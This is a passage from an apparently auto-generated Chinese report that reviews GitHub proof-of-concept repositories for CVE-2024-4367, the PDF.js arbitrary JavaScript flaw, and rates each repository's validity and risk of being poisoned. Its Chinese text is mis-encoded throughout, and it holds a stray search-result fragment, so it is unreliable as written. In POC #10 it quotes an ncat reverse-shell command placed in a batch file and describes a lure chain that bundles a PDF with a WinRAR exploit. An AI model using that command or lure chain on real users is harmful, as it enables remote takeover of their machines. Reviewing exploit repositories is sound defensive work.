    *   å°½ç®¡è„šæœ¬çš„ç›®çš„ä¼¼ä¹æ˜¯ä¸ºäº†æ–¹ä¾¿åœ°ä¸‹è½½å’Œå¯åŠ¨ç‰¹å®šç‰ˆæœ¬çš„Firefoxï¼Œä½†ç”¨æˆ·ä»ç„¶éœ€è¦ä»”ç»†æ£€æŸ¥è„šæœ¬çš„å†…å®¹ï¼Œç¡®ä¿ä¸‹è½½é“¾æ¥å’Œæ‰§è¡Œè¿‡ç¨‹æ˜¯å®‰å…¨çš„ã€‚
2.  **`CVE-2024-4367.py`è„šæœ¬ (æœªæä¾›å…·ä½“ä»£ç ):**
    *   è™½ç„¶`README.md`æŒ‡å‘ä¸€ä¸ªå¤–éƒ¨githubåº“ï¼Œä½†å¦‚æœæ­¤åº“è¢«ç¯¡æ”¹ï¼Œæ‰§è¡Œè„šæœ¬`CVE-2024-4367.py`ç”Ÿæˆçš„`poc.pdf`æ–‡ä»¶æœ‰å¯èƒ½åµŒå…¥æ›´æ¶æ„çš„Payload.
3.  **å…è´£å£°æ˜:**
    *   `README.md` ä¸­åŒ…å«å…è´£å£°æ˜ï¼Œè¿™è¡¨æ˜ä½œè€…æ„è¯†åˆ°æ½œåœ¨çš„é£é™©ï¼Œå¹¶è¯•å›¾æ’‡æ¸…è´£ä»»ã€‚ä½†è¿™å¹¶ä¸èƒ½å®Œå…¨æ¶ˆé™¤é£é™©ï¼Œç”¨æˆ·ä»ç„¶éœ€è¦è‡ªè¡Œæ‰¿æ‹…ä½¿ç”¨POCä»£ç çš„åæœã€‚

æ€»çš„æ¥è¯´ï¼Œè¯¥ä»“åº“çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æ¼”ç¤ºæ¼æ´åˆ©ç”¨ï¼Œè€Œä¸æ˜¯ä¸ºäº†è¿›è¡Œæ¶æ„æ”»å‡»ã€‚ä½†æ˜¯ï¼Œç”¨æˆ·åœ¨ä½¿ç”¨è¿™äº›ä»£ç æ—¶ä»ç„¶éœ€è¦ä¿æŒè­¦æƒ•ï¼Œä»”ç»†å®¡æŸ¥ä»£ç å†…å®¹ï¼Œç¡®ä¿äº†è§£æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´è§¦å‘:** æ”»å‡»è€…éœ€è¦åˆ¶ä½œåŒ…å«ç‰¹å®šæ ¼å¼çš„æ¶æ„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±ã€‚
2.  **JavaScriptæ‰§è¡Œ:** å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šå°è¯•è§£ææ¶æ„å­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´ä»»æ„JavaScriptä»£ç åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  **æ”»å‡»ç›®æ ‡:** æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç æ¥çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ cookiesï¼‰ã€æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€æˆ–è€…è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ã€‚

**æ€»ç»“ï¼š**
è¯¥æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”±äºFirefoxé»˜è®¤ä½¿ç”¨PDF.jsæ‰“å¼€PDFæ–‡ä»¶ï¼Œå› æ­¤è¯¥æ¼æ´å…·æœ‰è¾ƒé«˜çš„å½±å“èŒƒå›´ã€‚æä¾›çš„POCä»£ç å¯ä»¥å¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜éªŒè¯å’Œç†è§£è¯¥æ¼æ´ï¼Œä½†ä¹Ÿéœ€è¦æ³¨æ„æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [PenguinCabinet/CVE-2024-4367-hands-on](https://github.com/PenguinCabinet/CVE-2024-4367-hands-on)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #9

**æ¥æº**: [CVE-2024-4367-Scivous_CVE-2024-4367-npm.md](../2024/CVE-2024-4367-Scivous_CVE-2024-4367-npm.md)

## CVE-2024-4367-PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ¼æ´æºäºPDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨è¯¥æ¼æ´åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ¼æ´å½±å“Firefox, Firefox ESR, Thunderbirdã€‚ æ ¹æ®æœç´¢ç»“æœï¼ŒGitHubä¸Šå­˜åœ¨åˆ©ç”¨æ­¤æ¼æ´çš„POCä»£ç ã€‚ æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md)æ¯”è¾ƒç®€å•ï¼Œä»…ä»…æè¿°äº†CVE-2024-4367çš„å¤ç°ï¼Œä»è¯¥æ–‡ä»¶æ¥çœ‹ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ã€‚ä½†è€ƒè™‘åˆ°å®é™…çš„æ¼æ´åˆ©ç”¨ä»£ç å¯èƒ½åœ¨å…¶ä»–æ–‡ä»¶ä¸­ï¼Œéœ€è¦è¿›ä¸€æ­¥åˆ†ææ‰èƒ½ç¡®å®šæ˜¯å¦å­˜åœ¨æŠ•æ¯’è¡Œä¸ºã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç²¾å¿ƒæ„é€ çš„PDFæ–‡ä»¶è§¦å‘å­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼Œä»è€Œæ‰§è¡Œæ¶æ„JavaScriptä»£ç ã€‚CVSSè¯„åˆ†æ ¹æ®NVDçš„å˜æ›´è®°å½•ï¼Œä»åŸæ¥çš„CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:Lä¿®æ”¹ä¸ºäº†NIST AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H, è¿™è¡¨æ˜åˆ©ç”¨æ¡ä»¶å˜çš„å®¹æ˜“ï¼Œå±å®³æ€§æ›´é«˜äº†ã€‚å¦å¤–ï¼Œæœ‰è®¨è®ºè¡¨æ˜115.19.0esrä»ç„¶å—æ­¤æ¼æ´å½±å“ï¼Œéœ€è¦è¿›ä¸€æ­¥éªŒè¯ã€‚

**é¡¹ç›®åœ°å€:** [Scivous/CVE-2024-4367-npm](https://github.com/Scivous/CVE-2024-4367-npm)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #10

**æ¥æº**: [CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md](../2024/CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md)

## CVE-2024-4367 & CVE-2023-38831 PDFernet Remotelo

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** PDF.js å­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ & WinRARå‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird, WinRAR

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11, WinRAR <= 6.22

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿéœ€å®‰è£…å—å½±å“ç‰ˆæœ¬çš„Firefox/Thunderbirdå’ŒWinRARï¼Œä¸”ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

è¯¥POCåˆ©ç”¨äº†CVE-2024-4367 (PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ) å’Œ CVE-2023-38831 (WinRARå‘½ä»¤æ‰§è¡Œ) ä¸¤ä¸ªæ¼æ´ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼:**
1.  **CVE-2024-4367:**  é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡PDF.jsçš„ç±»å‹æ£€æŸ¥ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
2.  **CVE-2023-38831:**  åˆ©ç”¨WinRARå¤„ç†å‹ç¼©åŒ…æ—¶çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æ¶æ„raræ–‡ä»¶ä¸­åŒ…å«pdfå’Œbatè„šæœ¬,å½“ç”¨æˆ·å°è¯•æ‰“å¼€è¿™ä¸ªPDFæ–‡æ¡£æ—¶ï¼Œä¼šè§¦å‘WinRARæ¼æ´ï¼Œæ‰§è¡Œæ†ç»‘çš„BATè„šæœ¬ã€‚
3.  **POCä»£ç æµç¨‹:**
    *   ä¸»è„šæœ¬`PDFernetRemotelo.py`æç¤ºç”¨æˆ·è¾“å…¥æ”»å‡»è€…IPå’Œç«¯å£ã€‚
    *   åˆ›å»ºè¯±é¥µPDFæ–‡ä»¶ï¼ˆ`ResumendeSueldo.pdf`ï¼‰å’Œä¸€ä¸ªåŒ…å«åå‘shellå‘½ä»¤çš„BATè„šæœ¬ï¼ˆ`script.bat`ï¼‰ï¼Œè„šæœ¬å†…å®¹ä¸º`ncat {ip} {port} -e cmd.exe`ã€‚
    *   ä½¿ç”¨`PDFernet.py`è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„`poc.pdf`æ–‡ä»¶ï¼Œè¯¥JavaScriptä»£ç ç”±ç”¨æˆ·æä¾›çš„payloadç”Ÿæˆï¼Œæ­¤payloadä¼šè¢«åµŒå…¥åˆ°PDFçš„å­—ä½“ä¿¡æ¯ä¸­.
    *   `Remotelo.py`è„šæœ¬åˆ›å»ºä¸€ä¸ªRARå‹ç¼©åŒ…ï¼ˆ`PDFernetRemotelo.rar`ï¼‰ï¼Œå…¶ä¸­åŒ…å«è¯±é¥µPDFæ–‡ä»¶å’ŒBATè„šæœ¬ã€‚
    *   ç”¨æˆ·æ‰“å¼€`PDFernetRemotelo.rar`ä¸­çš„`ResumendeSueldo.pdf`ï¼Œè§¦å‘CVE-2024-4367ï¼Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
    *   æ¶æ„JavaScriptä»£ç å¯èƒ½è§¦å‘CVE-2023-38831ï¼Œæ‰§è¡ŒRARå‹ç¼©åŒ…ä¸­çš„`script.bat`ï¼Œå»ºç«‹ä¸æ”»å‡»è€…æœºå™¨çš„åå‘shellã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥POCåœ¨å—å½±å“çš„ç‰ˆæœ¬ä¸­æ˜¯æœ‰æ•ˆçš„ã€‚GitHubä¸Šå·²ç»æœ‰è¯¥æ¼æ´çš„æ­¦å™¨åŒ–åˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**
è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ä»£ç çš„PDFå’ŒRARæ–‡ä»¶ï¼Œå…¶æ ¸å¿ƒåŠŸèƒ½æ˜¯åˆ©ç”¨å·²çŸ¥çš„æ¼æ´ã€‚`PDFernetRemotelo.py` ä½¿ç”¨äº†å¤–éƒ¨è„šæœ¬ `PDFernet.py`å’Œ `Remotelo.py`ï¼Œå®¡æŸ¥è¿™äº›è„šæœ¬ï¼Œå‘ç°`PDFernet.py`ä¸­çš„payloadç”Ÿæˆé€»è¾‘æ˜¯å¯æ§çš„ï¼Œç›´æ¥æ¥è‡ªäºç”¨æˆ·æä¾›çš„å‚æ•°ã€‚`Remotelo.py`è„šæœ¬åˆ›å»ºRARå‹ç¼©åŒ…çš„è¿‡ç¨‹æ¯”è¾ƒæ ‡å‡†ã€‚æŠ•æ¯’é£é™©åœ¨äºï¼š
1.  **ä¾èµ–å¤–éƒ¨è„šæœ¬:** `PDFernetRemotelo.py` è°ƒç”¨äº†`PDFernet.py` å’Œ `Remotelo.py` è„šæœ¬,å­˜åœ¨æ¶æ„ä¿®æ”¹æ­¤è„šæœ¬çš„å¯èƒ½æ€§.
2.   **PayloadåµŒå…¥æ–¹å¼:** æ¶æ„ä»£ç åµŒå…¥åœ¨PDFå­—ä½“ä¿¡æ¯ä¸­ï¼Œå¦‚æœå¯¹PDFæ ¼å¼ä¸ç†Ÿæ‚‰ï¼Œå¾ˆéš¾ç›´æ¥çœ‹å‡ºæ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚å®¡æŸ¥æ—¶éœ€è°¨æ…ã€‚
3.   **éšè”½æ€§:** åˆ©ç”¨RARå‹ç¼©åŒ…å°†PDFå’ŒBATè„šæœ¬æ†ç»‘åœ¨ä¸€èµ·ï¼Œå¢åŠ äº†æ”»å‡»çš„éšè”½æ€§ã€‚

ä»£ç ä¸­å¯èƒ½å­˜åœ¨çš„æŠ•æ¯’ç‚¹åœ¨äºï¼š
1.  åœ¨`PDFernet.py`ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„JavaScriptä»£ç ï¼Œæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚ä¸‹è½½æ¶æ„æ–‡ä»¶æˆ–çªƒå–ç”¨æˆ·æ•°æ®ã€‚
2.  åœ¨ç”Ÿæˆçš„RARå‹ç¼©åŒ…ä¸­ï¼Œå¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„æ–‡ä»¶ï¼Œä¾‹å¦‚æ¶æ„DLLæ–‡ä»¶æˆ–åé—¨ç¨‹åºã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œè™½ç„¶æ ¸å¿ƒä»£ç çœ‹èµ·æ¥æ¯”è¾ƒç›´æ¥ï¼Œä½†è€ƒè™‘åˆ°ä¾èµ–å¤–éƒ¨è„šæœ¬ä»¥åŠpayloadåµŒå…¥æ–¹å¼çš„éšè”½æ€§ï¼Œä»ç„¶å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚ä¿å®ˆä¼°è®¡æŠ•æ¯’é£é™©ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [UnHackerEnCapital/PDFernetRemotelo](https://github.com/UnHackerEnCapital/PDFernetRemotelo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #11

**æ¥æº**: [CVE-2024-4367-VVeakee_CVE-2024-4367.md](../2024/CVE-2024-4367-VVeakee_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„JavaScriptä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨äº†è¯¥æ¼æ´ã€‚`CVE-2024-4367.py`è„šæœ¬èƒ½å¤Ÿç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ï¼Œè¿™æ®µä»£ç è¢«åµŒå…¥åˆ°PDFçš„å­—ä½“å®šä¹‰ä¸­ã€‚æœç´¢ç»“æœä¸­`exfil0/WEAPONIZING-CVE-2024-4367`ä¹Ÿå°è¯äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„ä»£ç ï¼Œ`CVE-2024-4367.py`è„šæœ¬çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«ç”¨æˆ·æŒ‡å®špayloadçš„PDFæ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ¶æ„ä»£ç æˆ–åé—¨ã€‚`win_calc.pdf`æ–‡ä»¶ç›´æ¥åŒ…å«æ‰§è¡Œ`calc`ç¨‹åºçš„ JavaScript ä»£ç ï¼ŒåŠŸèƒ½æ˜ç¡®ã€‚`xss.pdf` æ–‡ä»¶å†…å®¹ä¸å®Œæ•´ï¼Œæ— æ³•åˆ†æã€‚å› æ­¤ï¼Œè¯¥ä»“åº“çš„æŠ•æ¯’é£é™©è¾ƒä½ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨`CVE-2024-4367.py`è„šæœ¬ï¼Œé€šè¿‡å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„JavaScriptä»£ç ï¼Œç”Ÿæˆæ¶æ„çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼Œä¾‹å¦‚é€šè¿‡ç”µå­é‚®ä»¶ã€ç½‘ç«™ç­‰æ–¹å¼ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsè§£æå™¨ä¼šæ‰§è¡ŒPDFæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
4.  è¯¥JavaScriptä»£ç å¯ä»¥æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·ä¿¡æ¯ã€å®‰è£…æ¶æ„è½¯ä»¶ç­‰ã€‚

æ€»ä¹‹ï¼Œæ­¤æ¼æ´çš„CVSSè¯„åˆ†ä¸ºMediumï¼ˆ5.6ï¼‰ï¼Œä½†æ˜¯é€šè¿‡ä¿®æ”¹NVDæ•°æ®å¯ä»¥çœ‹åˆ°ï¼Œè¯¥æ¼æ´å¯èƒ½é€ æˆçš„å±å®³ç¨‹åº¦æ˜¯å¾ˆé«˜çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„PDFæ–‡ä»¶ï¼Œè¯±éª—ç”¨æˆ·æ‰“å¼€ï¼Œä»è€Œæ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯¼è‡´ä¸¥é‡çš„åæœã€‚æä¾›çš„PoCçš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œä¸”å½“å‰ä»£ç æœªå‘ç°å­˜åœ¨æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [VVeakee/CVE-2024-4367](https://github.com/VVeakee/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #12

**æ¥æº**: [CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md](../2024/CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md)

## CVE-2024-4367-Mozilla-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²å’Œæ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxï¼ŒFirefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡æ¡£ï¼Œå½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxï¼ŒFirefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç»•è¿‡ PDF.js å¯¹å­—ä½“çš„ç±»å‹æ£€æŸ¥ï¼Œä»è€Œå…è®¸æ‰§è¡Œæœªç»æˆæƒçš„ JavaScript ä»£ç ã€‚æ ¹æ®æœç´¢ç»“æœå’Œæ¼æ´æè¿°ï¼Œè¯¥æ¼æ´çš„ä¸¥é‡æ€§åœ¨äºå¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ç¯å¢ƒä¸­æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œå¯èƒ½çªƒå–ç”¨æˆ·å‡­æ®ã€å®‰è£…æ¶æ„è½¯ä»¶æˆ–è€…æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ä»…åŒ…å«GNUé€šç”¨å…¬å…±è®¸å¯è¯å£°æ˜ï¼Œå¹¶ä¸èƒ½åˆ¤æ–­æ¼æ´æœ‰æ•ˆæ€§ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„æ¼æ´ä»£ç æ‰èƒ½éªŒè¯ï¼Œä½†æ˜¯æ ¹æ®githubæœç´¢ç»“æœ [webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367 ï¼Œè¯æ˜POCæœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ç‰‡æ®µåªåŒ…å«äº†GNUé€šç”¨å…¬å…±è®¸å¯è¯çš„æ–‡æœ¬å†…å®¹ï¼Œå±äºå¼€æºåè®®çš„å£°æ˜ï¼Œ**ä¸åŒ…å«ä»»ä½•å¯æ‰§è¡Œçš„ä»£ç æˆ–è€…é…ç½®æ–‡ä»¶**ï¼Œå› æ­¤æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¿¹è±¡ï¼Œåˆ¤æ–­æŠ•æ¯’é£é™©ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [Zombie-Kaiser/cve-2024-4367-PoC-fixed](https://github.com/Zombie-Kaiser/cve-2024-4367-PoC-fixed)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #13

**æ¥æº**: [CVE-2024-4367-avalahEE_pdfjs_disable_eval.md](../2024/CVE-2024-4367-avalahEE_pdfjs_disable_eval.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Firefox, Firefox ESR å’Œ Thunderbird æµè§ˆå™¨ä¸­çš„ PDF.js ç»„ä»¶çš„æ¼æ´ã€‚è¯¥æ¼æ´ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿçªƒå–ä¿¡æ¯ã€æ‰§è¡Œæ¶æ„æ“ä½œæˆ–å®Œå…¨æ§åˆ¶å—å®³è€…çš„æµè§ˆå™¨ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å½±å“ç‰¹å®šç‰ˆæœ¬çš„Firefox, Firefox ESRå’ŒThunderbirdï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶æ¥è§¦å‘æ¼æ´ã€‚æ¼æ´åº“ä¿¡æ¯è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªè¾ƒä¸ºä¸¥é‡çš„é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©ï¼š**
